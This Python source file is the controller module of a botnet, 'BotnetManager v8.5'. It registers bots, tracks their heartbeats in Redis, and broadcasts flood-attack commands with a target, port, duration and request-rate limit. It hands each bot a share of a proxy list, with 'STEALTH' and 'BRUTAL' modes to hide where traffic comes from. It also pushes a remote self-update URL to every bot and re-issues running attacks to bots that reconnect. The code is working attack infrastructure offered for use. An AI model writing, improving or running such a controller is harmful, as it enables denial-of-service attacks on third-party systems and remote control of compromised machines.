import asyncio
import json
import time
import random
import logging
from typing import Dict, Optional, List, Set, Any
from datetime import datetime
import socket

from app.core.config import settings
from app.core.logger import logger, log_bot_event
from app.core.redis_client import get_redis, RedisKeys
from app.core.models import BotStats, BotHeartbeat, BotRegister, AttackResult
from app.managers.proxy_manager import proxy_manager


# ================================================================
# OPTIMAL PROXY DISTRIBUTION CONFIG
# ================================================================
class ProxyDistributionConfig:
    HIGH_BOT_HIGH_PROXY = {
        "max_proxies_per_bot": 500,
        "min_proxies_per_bot": 100,
        "overlap": 50,
        "refresh_interval": 180,
        "protocol_mix": {"http": 0.6, "socks5": 0.3, "socks4": 0.1},
        "speed_tier_min": "medium",
    }

    LOW_BOT_HIGH_PROXY = {
        "max_proxies_per_bot": 1000,
        "min_proxies_per_bot": 200,
        "overlap": 100,
        "refresh_interval": 300,
        "protocol_mix": {"http": 0.5, "socks5": 0.4, "socks4": 0.1},
        "speed_tier_min": "fast",
    }

    HIGH_BOT_LOW_PROXY = {
        "max_proxies_per_bot": 200,
        "min_proxies_per_bot": 50,
        "overlap": 20,
        "refresh_interval": 120,
        "protocol_mix": {"http": 0.7, "socks5": 0.2, "socks4": 0.1},
        "speed_tier_min": "medium",
    }

    STEALTH_MODE = {
        "max_proxies_per_bot": 300,
        "min_proxies_per_bot": 100,
        "overlap": 50,
        "refresh_interval": 60,
        "protocol_mix": {"http": 0.2, "socks5": 0.6, "socks4": 0.2},
        "speed_tier_min": "fast",
    }

    BRUTAL_MODE = {
        "max_proxies_per_bot": 800,
        "min_proxies_per_bot": 200,
        "overlap": 100,
        "refresh_interval": 300,
        "protocol_mix": {"http": 0.8, "socks5": 0.15, "socks4": 0.05},
        "speed_tier_min": "medium",
    }


# ================================================================
# BOTNET MANAGER v8.5 — FULL SYNC FIX
# ================================================================
class BotnetManager:
    def __init__(self):
        self.active_writers: Dict[str, asyncio.StreamWriter] = {}
        self._lock = asyncio.Lock()
        self._cleanup_task: Optional[asyncio.Task] = None
        self._running = False
        self._last_seen: Dict[str, int] = {}
        self._proxy_config = ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY
        self._attack_manager = None  # Lazy loaded
        self._heartbeat_timeout = 45  # FIX: Increased from 30 to 45 seconds
        self._cleanup_interval = 15   # FIX: Check every 15s instead of 10s

    @property
    def attack_manager(self):
        if self._attack_manager is None:
            from app.managers.attack_manager import attack_manager
            self._attack_manager = attack_manager
        return self._attack_manager

    async def start(self):
        if self._running:
            return
        self._running = True
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        logger.info("BotnetManager started. Heartbeat timeout: {}s, cleanup interval: {}s".format(self._heartbeat_timeout, self._cleanup_interval))

    async def stop(self):
        self._running = False
        if self._cleanup_task:
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass
        async with self._lock:
            for writer in self.active_writers.values():
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
            self.active_writers.clear()
            self._last_seen.clear()
        logger.info("BotnetManager stopped.")

    async def handle_message(self, writer: asyncio.StreamWriter, msg: dict):
        msg_type = msg.get("type")
        bot_id = msg.get("id")

        if not bot_id:
            logger.warning("Message without bot ID, ignoring.")
            return

        if not isinstance(bot_id, str) or not bot_id.strip():
            logger.warning("Invalid bot ID received: {!r}. Check bot config.ini!".format(bot_id))
            return

        bot_id = bot_id.strip()
        now = int(time.time())

        # FIX: Always update last_seen when ANY message received
        self._last_seen[bot_id] = now

        if not msg_type:
            logger.debug("Message from {} without type field. Keys: {}".format(bot_id, list(msg.keys())))
            if "cmd" in msg:
                msg_type = "command"
            else:
                logger.warning("Cannot infer message type from {}, ignoring.".format(bot_id))
                return

        logger.info("📩 Received {} from bot {}".format(msg_type, bot_id))

        if msg_type == "register":
            await self._handle_register(writer, msg)
        elif msg_type == "heartbeat":
            await self._handle_heartbeat(msg)
        elif msg_type == "attack_result":
            await self._handle_attack_result(msg)
        elif msg_type == "attack_progress":
            await self._handle_attack_progress(msg)
        elif msg_type == "attack_started":
            logger.info("Bot {} started attack {}".format(bot_id, msg.get("attack_id")))
        elif msg_type == "attack_stopped":
            logger.info("Bot {} stopped attack {}".format(bot_id, msg.get("attack_id")))
        elif msg_type == "all_stopped":
            logger.info("Bot {} confirmed all attacks stopped".format(bot_id))
            await self._handle_all_stopped(msg)
        elif msg_type == "proxy_updated":
            logger.info("Bot {} updated proxies: {} proxies".format(bot_id, msg.get("count", 0)))
        elif msg_type == "proxy_refreshed":
            logger.info("Bot {} refreshed proxies for attack {}: {} new".format(
                bot_id, msg.get("attack_id"), msg.get("new_count", 0)))
        elif msg_type == "pong":
            pass
        elif msg_type == "command":
            # Bot might echo back command receipt
            logger.info("Bot {} acknowledged command: {}".format(bot_id, msg.get("cmd")))
        else:
            logger.warning("Unknown message type from {}: {}".format(bot_id, msg_type))

    def _get_optimal_config(self, bot_count: int, proxy_count: int) -> dict:
        if bot_count <= 2 and proxy_count >= 2000:
            return ProxyDistributionConfig.LOW_BOT_HIGH_PROXY
        elif bot_count >= 10 and proxy_count <= 1000:
            return ProxyDistributionConfig.HIGH_BOT_LOW_PROXY
        elif bot_count <= 5 and proxy_count >= 1000:
            return ProxyDistributionConfig.BRUTAL_MODE
        else:
            return ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY

    async def broadcast_attack_with_proxies(self, attack_data: dict, proxies: List[str]) -> dict:
        async with self._lock:
            if not self.active_writers:
                logger.warning("[ATTACK] No bots connected!")
                return {"status": "failed", "reason": "no_bots", "bots": 0}
            bot_count = len(self.active_writers)

        config = self._get_optimal_config(bot_count, len(proxies))
        self._proxy_config = config

        # FIX: Calculate proxies per bot - give MORE proxies to each bot
        proxies_per_bot = min(
            config["max_proxies_per_bot"],
            max(config["min_proxies_per_bot"],
                len(proxies) // bot_count + config["overlap"])
        )

        # FIX: If we have tons of proxies and few bots, give each bot more
        if len(proxies) > 5000 and bot_count <= 5:
            proxies_per_bot = min(1000, len(proxies) // bot_count + 100)

        logger.info("[ATTACK] OPTIMAL MODE: {} bots, {} proxies, {}/bot, refresh={}s, speed>={}".format(
            bot_count, len(proxies), proxies_per_bot, 
            config["refresh_interval"], config["speed_tier_min"]))

        random.shuffle(proxies)

        async with self._lock:
            bot_list = list(self.active_writers.items())

        sent_count = 0
        failed_count = 0

        for i, (bot_id, writer) in enumerate(bot_list):
            if writer.is_closing():
                failed_count += 1
                continue

            # FIX: Better proxy distribution with overlap
            start_idx = (i * proxies_per_bot) % len(proxies)
            end_idx = start_idx + proxies_per_bot
            if end_idx > len(proxies):
                bot_proxies = proxies[start_idx:] + proxies[:end_idx - len(proxies)]
            else:
                bot_proxies = proxies[start_idx:end_idx]

            # FIX: Ensure we send at least some proxies
            if not bot_proxies and proxies:
                bot_proxies = proxies[:min(100, len(proxies))]

            bot_attack_cmd = {
                "type": "command",
                "cmd": "attack",
                "attack_id": attack_data.get("attack_id", str(time.time())),
                "method": attack_data["method"],
                "target": attack_data["target"],
                "port": attack_data.get("port", 80),
                "duration": attack_data["duration"],
                "hold_time": attack_data.get("hold_time", 0),
                "rps_limit": attack_data.get("rps_limit", 1500),
                "extra": attack_data.get("extra", ""),
                "proxies": bot_proxies,
            }

            try:
                success = await self._send_to_writer(writer, json.dumps(bot_attack_cmd) + "\n")
                if success:
                    sent_count += 1
                    logger.info("[ATTACK] ✅ Sent attack command to bot {} with {} proxies".format(
                        bot_id, len(bot_proxies)))
                else:
                    failed_count += 1
                    logger.warning("[ATTACK] ❌ Failed to send to bot {} (writer error)".format(bot_id))
            except Exception as e:
                failed_count += 1
                logger.error("[ATTACK] ❌ Failed to send to bot {}: {}".format(bot_id, e))

        logger.info("[ATTACK] Launched: {} bots, {} failed, {} proxies, {}/bot".format(
            sent_count, failed_count, len(proxies), proxies_per_bot))

        return {
            "status": "launched",
            "bots": sent_count,
            "failed": failed_count,
            "total_proxies": len(proxies),
            "proxies_per_bot": proxies_per_bot,
            "mode": self._get_mode_name(config),
        }

    def _get_mode_name(self, config: dict) -> str:
        for name, cfg in vars(ProxyDistributionConfig).items():
            if isinstance(cfg, dict) and cfg == config:
                return name
        return "CUSTOM"

    async def broadcast_proxy_refresh(self, attack_id: str, proxies: List[str]) -> dict:
        async with self._lock:
            if not self.active_writers:
                return {"status": "failed", "reason": "no_bots"}
            bot_count = len(self.active_writers)

        config = self._proxy_config
        proxies_per_bot = min(
            config["max_proxies_per_bot"] - 50,
            max(config["min_proxies_per_bot"],
                len(proxies) // bot_count + config["overlap"] // 2)
        )

        random.shuffle(proxies)

        async with self._lock:
            bot_list = list(self.active_writers.items())

        sent_count = 0
        for i, (bot_id, writer) in enumerate(bot_list):
            if writer.is_closing():
                continue

            start_idx = (i * proxies_per_bot) % len(proxies)
            end_idx = start_idx + proxies_per_bot
            if end_idx > len(proxies):
                bot_proxies = proxies[start_idx:] + proxies[:end_idx - len(proxies)]
            else:
                bot_proxies = proxies[start_idx:end_idx]

            refresh_cmd = {
                "type": "command",
                "cmd": "proxy_refresh",
                "attack_id": attack_id,
                "proxies": bot_proxies,
            }

            try:
                success = await self._send_to_writer(writer, json.dumps(refresh_cmd) + "\n")
                if success:
                    sent_count += 1
                else:
                    logger.warning("[REFRESH] Failed to send to bot {} (writer error)".format(bot_id))
            except Exception as e:
                logger.error("[REFRESH] Failed to send to bot {}: {}".format(bot_id, e))

        logger.info("[REFRESH] Sent to {} bots for attack {}".format(sent_count, attack_id))
        return {"status": "refreshed", "bots": sent_count}

    async def broadcast_command(self, command: dict, exclude: Optional[List[str]] = None):
        async with self._lock:
            valid_items = [
                (bid, w) for bid, w in self.active_writers.items()
                if not w.is_closing()
            ]
            bot_ids = [bid for bid, _ in valid_items]
            writers = [w for _, w in valid_items]

        if not writers:
            logger.warning("No bots connected to broadcast command '{}'.".format(command.get("cmd")))
            return

        logger.info("Broadcasting command '{}' to {} bots: {}".format(
            command.get("cmd"), len(writers), bot_ids))

        if "type" not in command:
            command["type"] = "command"

        cmd_json = json.dumps(command) + "\n"
        excluded_set = set(exclude) if exclude else set()

        tasks = []
        for bot_id, writer in zip(bot_ids, writers):
            if bot_id in excluded_set:
                continue
            tasks.append(self._send_with_retry(writer, cmd_json, bot_id))

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success_count = sum(1 for r in results if r is True)
            logger.info("Broadcast complete: {}/{} bots reached".format(success_count, len(tasks)))

    async def send_to_bot(self, bot_id: str, command: dict) -> bool:
        async with self._lock:
            writer = self.active_writers.get(bot_id)
            if not writer or writer.is_closing():
                return False

        if "type" not in command:
            command["type"] = "command"
        cmd_json = json.dumps(command) + "\n"
        return await self._send_with_retry(writer, cmd_json, bot_id)

    async def _send_with_retry(self, writer: asyncio.StreamWriter, data: str, bot_id: str, max_retries: int = 2) -> bool:
        for attempt in range(max_retries):
            try:
                writer.write(data.encode())
                await writer.drain()
                return True
            except Exception as e:
                if attempt < max_retries - 1:
                    logger.warning("Send to {} failed (attempt {}), retrying...".format(bot_id, attempt + 1))
                    await asyncio.sleep(0.1 * (attempt + 1))
                else:
                    logger.error("Send to {} failed after {} attempts: {}".format(bot_id, max_retries, e))
        return False

    async def get_bot_stats(self) -> BotStats:
        redis = await get_redis()
        async with self._lock:
            active_count = len(self.active_writers)

        total_bots_set = "{}bots:registered".format(RedisKeys.PREFIX)
        total_count = await redis.scard(total_bots_set)

        total_requests_key = "{}stats:bot_total_requests".format(RedisKeys.PREFIX)
        total_requests = int(await redis.get(total_requests_key) or 0)

        rpm_key = "{}stats:bot_rpm".format(RedisKeys.PREFIX)
        rpm = int(await redis.get(rpm_key) or 0)

        return BotStats(
            active=active_count,
            total=total_count,
            avg_rpm=rpm,
            total_requests=total_requests
        )

    async def update_proxies_for_bots(self):
        proxies = await proxy_manager.get_alive_proxies()
        proxy_strings = [str(p) for p in proxies]
        command = {
            "type": "command",
            "cmd": "proxy_update",
            "proxies": proxy_strings
        }
        await self.broadcast_command(command)
        logger.info("Sent proxy update ({} proxies) to all bots.".format(len(proxy_strings)))

    async def update_self_for_bots(self, url: str):
        command = {
            "type": "command",
            "cmd": "update_self",
            "url": url
        }
        await self.broadcast_command(command)
        logger.info("Sent self-update command to all bots: {}".format(url))

    async def remove_bot_on_disconnect(self, bot_id: str):
        async with self._lock:
            writer = self.active_writers.pop(bot_id, None)
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
                logger.info("✅ Bot {} removed from active_writers on disconnect".format(bot_id))
            self._last_seen.pop(bot_id, None)

        redis = await get_redis()
        bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
        await redis.hset(bot_key, "last_heartbeat", 0)
        log_bot_event(bot_id, "disconnected", {"reason": "connection_lost"})

    async def _handle_register(self, writer: asyncio.StreamWriter, msg: dict):
        bot_id = msg.get("id", "").strip()
        if not bot_id:
            logger.warning("Register message with empty bot_id, ignoring.")
            return

        addr = writer.get_extra_info('peername')
        ip = addr[0] if addr else "unknown"
        now = int(time.time())

        logger.info("📝 Processing register for bot {} from {}".format(bot_id, ip))

        async with self._lock:
            old_writer = self.active_writers.get(bot_id)
            if old_writer and old_writer is not writer:
                try:
                    old_writer.close()
                    await old_writer.wait_closed()
                except:
                    pass
                logger.info("Closed old writer for bot {}".format(bot_id))

            self.active_writers[bot_id] = writer
            self._last_seen[bot_id] = now
            logger.info("🔐 Added bot {} to active_writers. Total: {}".format(
                bot_id, len(self.active_writers)))

        redis = await get_redis()
        bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
        await redis.hset(bot_key, mapping={
            "id": bot_id,
            "ip": ip,
            "registered_at": now,
            "last_heartbeat": now
        })
        await redis.sadd("{}bots:registered".format(RedisKeys.PREFIX), bot_id)

        log_bot_event(bot_id, "registered", {"ip": ip})
        logger.info("✅ Bot {} registered from {}. Total bots: {}".format(
            bot_id, ip, len(self.active_writers)))

        # FIX: Send active attacks to newly connected bot!
        await self._send_active_attacks_to_bot(bot_id)

    async def _send_active_attacks_to_bot(self, bot_id: str):
        """FIX: Send all active attacks to a bot that just reconnected."""
        try:
            attack_mgr = self.attack_manager
            active = attack_mgr.get_active_attacks()
            if not active:
                logger.info("No active attacks to send to bot {}".format(bot_id))
                return

            for attack in active:
                # Get fresh proxies for this attack
                proxies = await proxy_manager.get_mixed_proxies(count=500)

                attack_cmd = {
                    "type": "command",
                    "cmd": "attack",
                    "attack_id": attack.id,
                    "method": attack.method,
                    "target": attack.target,
                    "port": attack.port,
                    "duration": attack.remaining,  # Send remaining time
                    "hold_time": attack.hold_remaining,
                    "rps_limit": 1500,  # Default, will be adjusted
                    "extra": "",
                    "proxies": proxies,
                }

                success = await self.send_to_bot(bot_id, attack_cmd)
                if success:
                    logger.info("🔄 Sent active attack {} to reconnected bot {}".format(
                        attack.id, bot_id))
                else:
                    logger.warning("Failed to send active attack to bot {}".format(bot_id))
        except Exception as e:
            logger.error("Error sending active attacks to bot {}: {}".format(bot_id, e))

    async def _handle_heartbeat(self, msg: dict):
        bot_id = msg.get("id", "").strip()
        if not bot_id:
            logger.warning("Heartbeat with empty bot_id, ignoring.")
            return
        now = int(time.time())

        # FIX: Update both memory and Redis
        self._last_seen[bot_id] = now

        logger.info("💓 Heartbeat received from bot {}".format(bot_id))
        redis = await get_redis()
        bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
        await redis.hset(bot_key, "last_heartbeat", now)

    async def _handle_all_stopped(self, msg: dict):
        bot_id = msg.get("id")
        logger.info("🛑 Bot {} confirmed all attacks stopped".format(bot_id))
        try:
            attack_mgr = self.attack_manager
            for attack_id in list(attack_mgr.active_attacks.keys()):
                attack = attack_mgr.active_attacks.get(attack_id)
                if attack:
                    attack.rps = 0
                    await attack_mgr._save_attack_to_redis(attack)
            log_bot_event(bot_id, "all_stopped", {"message": "Bot confirmed all attacks stopped"})
        except Exception as e:
            logger.error("Error handling all_stopped from {}: {}".format(bot_id, e))

    async def _handle_attack_result(self, msg: dict):
        bot_id = msg.get("id")
        attack_id = msg.get("attack_id")
        total_requests = msg.get("total_requests", 0)
        rps = msg.get("rps", 0)
        proxy_requests = msg.get("proxy_requests", 0)
        direct_requests = msg.get("direct_requests", 0)
        status = msg.get("status", "completed")
        error = msg.get("error")

        if not attack_id:
            logger.warning("Attack result from {} missing attack_id".format(bot_id))
            return

        logger.info("📊 Final result from {} for {}: {} reqs, {} RPS, proxy={}, direct={}, status={}".format(
            bot_id, attack_id, total_requests, rps, proxy_requests, direct_requests, status))
        if error:
            logger.warning("Bot {} attack {} error: {}".format(bot_id, attack_id, error))

        try:
            attack_mgr = self.attack_manager
            if attack_id in attack_mgr.active_attacks:
                attack = attack_mgr.active_attacks.get(attack_id)
                if attack:
                    attack.total_requests = total_requests
                    attack.rps = rps
                    await attack_mgr._save_attack_to_redis(attack)
                    log_bot_event(bot_id, "attack_completed", {
                        "attack_id": attack_id,
                        "total_requests": total_requests,
                        "rps": rps,
                        "proxy_requests": proxy_requests,
                        "direct_requests": direct_requests,
                        "status": status,
                        "error": error,
                    })
        except Exception as e:
            logger.error("Error handling attack result: {}".format(e))

        redis = await get_redis()
        total_req_key = "{}stats:bot_total_requests".format(RedisKeys.PREFIX)
        await redis.incrby(total_req_key, total_requests)

    async def _handle_attack_progress(self, msg: dict):
        bot_id = msg.get("id")
        attack_id = msg.get("attack_id")
        delta_requests = msg.get("delta_requests", 0)
        total_requests = msg.get("total_requests", 0)
        current_rps = msg.get("current_rps", 0)
        success_requests = msg.get("success_requests", 0)
        proxy_requests = msg.get("proxy_requests", 0)
        direct_requests = msg.get("direct_requests", 0)
        proxy_refresh_count = msg.get("proxy_refresh_count", 0)
        proxy_pool_alive = msg.get("proxy_pool_alive", 0)

        if not attack_id:
            logger.warning("Attack progress from {} missing attack_id".format(bot_id))
            return

        logger.debug("📈 Progress from {} for {}: +{} reqs, {} RPS, proxy={}, pool={}".format(
            bot_id, attack_id, delta_requests, current_rps, proxy_requests, proxy_pool_alive))

        try:
            attack_mgr = self.attack_manager
            if attack_id in attack_mgr.active_attacks:
                attack = attack_mgr.active_attacks.get(attack_id)
                if attack:
                    attack.total_requests += delta_requests
                    attack.rps = current_rps
                    await attack_mgr._save_attack_to_redis(attack)
        except Exception as e:
            logger.error("Error handling attack progress: {}".format(e))

    async def _send_to_writer(self, writer: asyncio.StreamWriter, data: str) -> bool:
        try:
            writer.write(data.encode())
            await writer.drain()
            return True
        except Exception as e:
            logger.error("Error sending to writer: {}".format(e))
            return False

    async def _cleanup_loop(self):
        while self._running:
            await asyncio.sleep(self._cleanup_interval)
            try:
                await self._cleanup_dead_bots()
            except Exception as e:
                logger.error("Error in cleanup loop: {}".format(e))

    async def _cleanup_dead_bots(self):
        now = int(time.time())
        stale_threshold = self._heartbeat_timeout

        async with self._lock:
            bot_ids = list(self.active_writers.keys())

        dead_bots = []
        for bot_id in bot_ids:
            last_seen = self._last_seen.get(bot_id, 0)

            # FIX: Check if writer is already closed
            async with self._lock:
                writer = self.active_writers.get(bot_id)
                if writer and writer.is_closing():
                    dead_bots.append(bot_id)
                    logger.debug("Bot {} writer is closing".format(bot_id))
                    continue

            # Check last seen time
            if last_seen and (now - last_seen) <= stale_threshold:
                continue

            # Double check with Redis
            redis = await get_redis()
            bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
            last_hb = await redis.hget(bot_key, "last_heartbeat")
            if last_hb:
                try:
                    last_hb = int(last_hb)
                    if last_hb == 0:
                        dead_bots.append(bot_id)
                    elif (now - last_hb) > stale_threshold:
                        dead_bots.append(bot_id)
                        logger.debug("Bot {} stale heartbeat: {}s ago".format(bot_id, now - last_hb))
                except:
                    dead_bots.append(bot_id)
            else:
                dead_bots.append(bot_id)
                logger.debug("Bot {} has no heartbeat record".format(bot_id))

        for bot_id in dead_bots:
            await self._remove_bot(bot_id)

        if dead_bots:
            logger.info("Removed {} stale bots: {}".format(len(dead_bots), dead_bots))

    async def _remove_bot(self, bot_id: str):
        logger.info("🗑️ Removing bot {} from active_writers".format(bot_id))

        async with self._lock:
            writer = self.active_writers.pop(bot_id, None)
            self._last_seen.pop(bot_id, None)
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass

        redis = await get_redis()
        bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
        await redis.hset(bot_key, "last_heartbeat", 0)

        log_bot_event(bot_id, "disconnected", {"reason": "stale heartbeat"})

    async def get_active_bot_ids(self) -> List[str]:
        async with self._lock:
            return list(self.active_writers.keys())

    def is_bot_online(self, bot_id: str) -> bool:
        writer = self.active_writers.get(bot_id)
        return writer is not None and not writer.is_closing()


# ========== SINGLETON INSTANCE ==========
botnet_manager = BotnetManager()